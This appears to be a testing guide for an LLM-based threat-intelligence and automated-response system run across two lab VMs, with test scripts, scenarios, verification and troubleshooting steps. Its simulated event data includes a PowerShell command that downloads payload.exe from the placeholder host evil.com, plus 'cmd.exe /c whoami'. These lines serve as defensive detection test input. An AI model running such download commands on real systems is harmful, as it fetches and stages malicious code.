# VM Action-Response Testing Guide

## Overview

This guide provides step-by-step instructions for testing the action-response mechanism across VMware virtual machines. This setup simulates a realistic security operations environment where the MedFlow threat intelligence system runs on one VM and generates events from another VM.

## Prerequisites

### Hardware Requirements
- Host machine with VMware Workstation/Player or VirtualBox
- Minimum 8GB RAM (16GB recommended)
- 50GB free disk space

### Software Requirements
- VMware Workstation/Player or VirtualBox
- Linux VM images (Ubuntu 22.04 LTS recommended)
- Python 3.10+ on both VMs
- Network connectivity between VMs

### Network Configuration
- **VM1 (MedFlow Server)**: 192.168.1.27
- **VM2 (Target Node)**: 192.168.1.28
- Network mode: Bridged or Host-only with same subnet

## VM Setup

### VM1: MedFlow Server Setup

1. **Create VM**:
   - Name: `medflow-server`
   - OS: Ubuntu 22.04 LTS
   - RAM: 4GB
   - CPU: 2 cores
   - Disk: 20GB
   - Network: Bridged

2. **Install Dependencies**:
   ```bash
   sudo apt update
   sudo apt install -y python3 python3-pip python3-venv git
   
   # Clone repository
   cd /home/
   git clone <repository-url>
   cd MedFlow_AI_Cybersecurity/week2/agentic-threat-intelligence
   
   # Create virtual environment
   python3 -m venv .venv
   source .venv/bin/activate
   
   # Install dependencies
   pip install -r requirements.txt
   ```

3. **Configure Environment**:
   ```bash
   cp .env.example .env
   nano .env
   ```
   
   Set required variables:
   ```env
   GROQ_API_KEY=your_groq_api_key
   AUTO_RESPONSE_ENABLED=false
   DRY_RUN=true
   ```

4. **Ingest ATT&CK Data**:
   ```bash
   python -m rag.ingest_attack
   ```

5. **Start Server**:
   ```bash
   source .venv/bin/activate
   python app.py
   ```

### VM2: Target Node Setup

1. **Create VM**:
   - Name: `target-node2`
   - OS: Ubuntu 22.04 LTS
   - RAM: 2GB
   - CPU: 1 core
   - Disk: 15GB
   - Network: Bridged

2. **Install Python**:
   ```bash
   sudo apt update
   sudo apt install -y python3 python3-pip
   ```

3. **Create Test Script**:
   ```bash
   nano /root/test_api.py
   ```
   
   Content:
   ```python
   import requests
   import json
   
   # MedFlow server IP
   SERVER = "http://192.168.1.27:5000/investigate"
   
   # Test event: PowerShell download attack
   events = [
       {
           "timestamp": "2025-07-03T10:00:00Z",
           "source_ip": "185.220.101.45",
           "destination_ip": "192.168.1.28",
           "event_type": "network_connection",
           "process_name": "powershell.exe",
           "user": "Administrator",
           "command_line": "powershell Invoke-WebRequest http://evil.com/payload.exe",
           "hostname": "target-node2"
       }
   ]
   
   print("Sending test event to MedFlow server...")
   response = requests.post(SERVER, json=events)
   
   print(f"Status: {response.status_code}")
   if response.status_code == 200:
       result = response.json()
       
       print("\n=== INVESTIGATION RESULTS ===")
       print(f"Campaign: {result.get('campaign', {}).get('name', 'N/A')}")
       print(f"Confidence: {result.get('campaign', {}).get('confidence', 0):.2f}")
       
       print(f"\n=== TECHNIQUES DETECTED ===")
       for tech in result.get('techniques', []):
           print(f"- {tech.get('technique_id', 'N/A')}: {tech.get('name', 'N/A')} ({tech.get('confidence', 0):.2f})")
       
       print(f"\n=== IOCs FOUND ===")
       for ioc in result.get('iocs', []):
           print(f"- {ioc.get('ioc_type', 'N/A')}: {ioc.get('value', 'N/A')} ({ioc.get('verdict', 'N/A')})")
       
       print(f"\n=== ACTIONS TAKEN ===")
       actions = result.get('actions_taken', [])
       if actions:
           for action in actions:
               act = action.get('action', {})
               print(f"- {act.get('action_type', 'N/A')} -> {act.get('target', 'N/A')}: {action.get('status', 'N/A')}")
               if action.get('dry_run'):
                   print(f"  (DRY RUN - no real action executed)")
       else:
           print("No actions taken")
   else:
       print(f"Error: {response.text}")
   ```

## Network Configuration

### Verify Connectivity

**On VM1 (MedFlow Server)**:
```bash
# Check IP address
hostname -I

# Test connectivity to VM2
ping 192.168.1.28

# Check if Flask is listening
ss -tlnp | grep 5000
```

**On VM2 (Target Node)**:
```bash
# Check IP address
hostname -I

# Test connectivity to VM1
ping 192.168.1.27

# Test HTTP connection
curl http://192.168.1.27:5000
```

### Firewall Configuration

**On VM1 (MedFlow Server)**:
```bash
# Allow Flask port
sudo ufw allow 5000/tcp
sudo ufw enable

# Or with firewalld
sudo firewall-cmd --permanent --add-port=5000/tcp
sudo firewall-cmd --reload
```

## Test Scenarios

### Scenario 1: Basic Action Generation (Dry Run)

**Purpose**: Verify action generation without real API calls

**Steps**:
1. Ensure `DRY_RUN=true` in `.env` on VM1
2. Start Flask server on VM1
3. Run test script on VM2
4. Check server logs for action generation

**Expected Results**:
- 4 actions generated (block_ip x2, isolate_host, notify_analyst)
- All actions marked as "pending_approval"
- Dry run logs: `[DRY RUN] BLOCK_IP -> 185.220.101.45`

### Scenario 2: Auto-Execution (Simulated)

**Purpose**: Test auto-execution with simulated connectors

**Steps**:
1. Set `AUTO_RESPONSE_ENABLED=true` in `.env` on VM1
2. Keep `DRY_RUN=true` for safety
3. Restart Flask server on VM1
4. Run test script on VM2
5. Check server logs for execution

**Expected Results**:
- Actions with confidence ≥0.70 execute automatically
- Actions with confidence <0.70 require approval
- Audit log entries created

### Scenario 3: Policy Enforcement

**Purpose**: Verify policy rules prevent unauthorized actions

**Steps**:
1. Add protected target to `actions/policy.py`:
   ```python
   PROTECTED_TARGETS = {
       "DC-FILESRV01",
       "domain admin",
       "target-node2",  # Add this
   }
   ```
2. Restart Flask server on VM1
3. Run test script on VM2
4. Check action status

**Expected Results**:
- Actions targeting "target-node2" are denied
- Other actions still execute
- Policy decision logged

### Scenario 4: Rate Limiting

**Purpose**: Verify rate limiting prevents action spam

**Steps**:
1. Run test script 4 times rapidly on VM2
2. Check server logs

**Expected Results**:
- First 3 actions execute
- 4th action blocked due to rate limit
- Rate limit warning in logs

### Scenario 5: LLM Fallback

**Purpose**: Test fallback mechanism when LLM fails

**Steps**:
1. Temporarily break LLM connection (set invalid API key)
2. Run test script on VM2
3. Check server logs

**Expected Results**:
- LLM error logged
- Fallback actions generated
- IOC-based actions created
- notify_analyst always included

## Verification Steps

### 1. Server-Side Verification

**Check Server Logs**:
```bash
# On VM1, monitor logs while running test
tail -f /var/log/syslog | grep medflow

# Or if using file logging
tail -f medflow.log
```

**Key Log Messages to Verify**:
- `Running Response Agent`
- `LLM response received`
- `Parsed X action proposals`
- `Evaluating action -> target`
- `Policy decision = X`
- `Action waiting approval` or `Action executed`

**Check Audit Log**:
```bash
# On VM1
cat actions/audit_log.json | jq
```

**Verify Audit Entry Structure**:
```json
{
  "timestamp": "ISO 8601",
  "campaign_id": "string",
  "action": {
    "action_type": "string",
    "target": "string",
    "severity": "string",
    "confidence": float,
    "rationale": "string"
  },
  "status": "string",
  "detail": "string",
  "dry_run": bool
}
```

### 2. Client-Side Verification

**Check Test Script Output**:
```bash
# On VM2
python3 /root/test_api.py
```

**Verify Response Structure**:
- Status: 200
- Campaign data present
- Techniques detected
- IOCs identified
- Actions taken array populated

### 3. Network Verification

**Test HTTP Connection**:
```bash
# On VM2
curl -X POST http://192.168.1.27:5000/investigate \
  -H "Content-Type: application/json" \
  -d '{"events": [{"description": "test"}]}'
```

**Verify Response Time**:
- Should complete within 60-90 seconds
- Longer times indicate network or LLM issues

### 4. Action Verification

**Verify Action Types**:
- `block_ip`: For malicious IPs/domains
- `isolate_host`: For compromised hosts
- `notify_analyst`: Always present

**Verify Action Targets**:
- Exact values from IOCs
- No invented targets
- Hostname from timeline

**Verify Action Severity**:
- Malicious IOCs → HIGH severity
- Suspicious IOCs → MEDIUM severity
- notify_analyst → MEDIUM severity

**Verify Action Confidence**:
- Based on IOC confidence
- 0.0-1.0 range
- Consistent with evidence

## Troubleshooting

### Connection Issues

**Problem**: "No route to host"
- **Solution**: Check network configuration, ensure both VMs on same subnet
- **Command**: `ping 192.168.1.27` from VM2

**Problem**: "Connection refused"
- **Solution**: Ensure Flask server is running on VM1
- **Command**: `ss -tlnp | grep 5000` on VM1

**Problem**: "Address already in use"
- **Solution**: Kill existing Flask process
- **Command**: `pkill -f "python app.py"`

### Action Generation Issues

**Problem**: No actions generated
- **Solution**: Check LLM API key, verify GROQ_API_KEY in `.env`
- **Command**: `python test_response_agent.py` on VM1

**Problem**: Actions always pending_approval
- **Solution**: Check AUTO_RESPONSE_ENABLED setting
- **Command**: `grep AUTO_RESPONSE_ENABLED .env`

**Problem**: Actions denied
- **Solution**: Check PROTECTED_TARGETS in policy.py
- **Command**: `grep PROTECTED_TARGETS actions/policy.py`

### LLM Issues

**Problem**: "429 Too Many Requests"
- **Solution**: Groq API rate limit, wait and retry
- **Action**: Built-in retry logic handles this

**Problem**: LLM timeout
- **Solution**: Check network connectivity to Groq API
- **Command**: `curl https://api.groq.com`

### Connector Issues

**Problem**: "No real connector configured"
- **Solution**: Configure connector credentials in `.env`
- **Action**: Set FIREWALL_API_URL, WAZUH_API_URL, etc.

**Problem**: Connector execution failed
- **Solution**: Check connector API credentials and network
- **Command**: Test connector API directly

## Advanced Testing

### Test with Real Connectors

**Prerequisites**:
- Real firewall/EDR/IAM infrastructure
- Valid API credentials
- `DRY_RUN=false`

**Steps**:
1. Configure real connector credentials in `.env`
2. Set `DRY_RUN=false`
3. Set `AUTO_RESPONSE_ENABLED=true`
4. Run test with low-confidence event first
5. Verify real API calls made
6. Check external system for action execution

**Verification**:
- Check firewall rules for blocked IPs
- Check EDR console for isolated hosts
- Check IAM for disabled accounts
- Check Slack for notifications

### Test with Multiple Events

**Scenario**: Multi-stage attack simulation

**Test Script**:
```python
events = [
    {
        "timestamp": "2025-07-03T10:00:00Z",
        "event_type": "network_connection",
        "process_name": "powershell.exe",
        "command_line": "powershell Invoke-WebRequest http://evil.com/payload.exe",
        "hostname": "target-node2"
    },
    {
        "timestamp": "2025-07-03T10:05:00Z",
        "event_type": "process_creation",
        "process_name": "cmd.exe",
        "command_line": "cmd.exe /c whoami",
        "hostname": "target-node2"
    },
    {
        "timestamp": "2025-07-03T10:10:00Z",
        "event_type": "file_creation",
        "file_path": "C:\\Windows\\Temp\\payload.exe",
        "hostname": "target-node2"
    }
]
```

**Expected Results**:
- Campaign correlation across events
- More confident action recommendations
- Multiple actions based on combined evidence

## Performance Testing

### Load Testing

**Purpose**: Test system under concurrent requests

**Tool**: Apache Bench (ab)

```bash
# On VM2
sudo apt install apache2-utils

# Run 10 concurrent requests
ab -n 10 -c 5 -p test_events.json -T application/json \
  http://192.168.1.27:5000/investigate
```

**Metrics to Monitor**:
- Response time
- Error rate
- Server CPU/memory usage
- LLM rate limiting

### Stress Testing

**Purpose**: Test system limits

**Steps**:
1. Send 100 requests rapidly
2. Monitor server resources
3. Check for memory leaks
4. Verify audit log integrity

## Security Testing

### Input Validation

**Test**: Malformed JSON input
```bash
curl -X POST http://192.168.1.27:5000/investigate \
  -H "Content-Type: application/json" \
  -d '{"invalid": "data"}'
```

**Expected**: Graceful error handling, no crash

### Authentication Bypass

**Test**: Request without valid event data
```bash
curl -X POST http://192.168.1.27:5000/investigate \
  -H "Content-Type: application/json" \
  -d '{}'
```

**Expected**: Appropriate error response

### Rate Limiting Bypass

**Test**: Rapid requests from same target
```bash
for i in {1..10}; do
  python3 /root/test_api.py &
done
```

**Expected**: Rate limiting enforced

## Cleanup

### Stop Server
```bash
# On VM1
pkill -f "python app.py"
```

### Remove Test Data
```bash
# On VM1
rm actions/audit_log.json

# On VM2
rm /root/test_api.py
```

### Reset Configuration
```bash
# On VM1
# Reset .env to safe defaults
nano .env
# Set AUTO_RESPONSE_ENABLED=false
# Set DRY_RUN=true
```

## Summary

This guide provides comprehensive testing procedures for the action-response mechanism across VMware virtual machines. Key takeaways:

1. **Network Setup**: Ensure proper connectivity between VMs
2. **Dry Run First**: Always test with DRY_RUN=true before real execution
3. **Incremental Testing**: Start with basic scenarios, progress to advanced
4. **Verification**: Check logs, audit trails, and external systems
5. **Safety**: Use protected targets and rate limiting for safety

The action-response mechanism is designed with multiple safety layers, making it suitable for testing in simulated environments before production deployment.
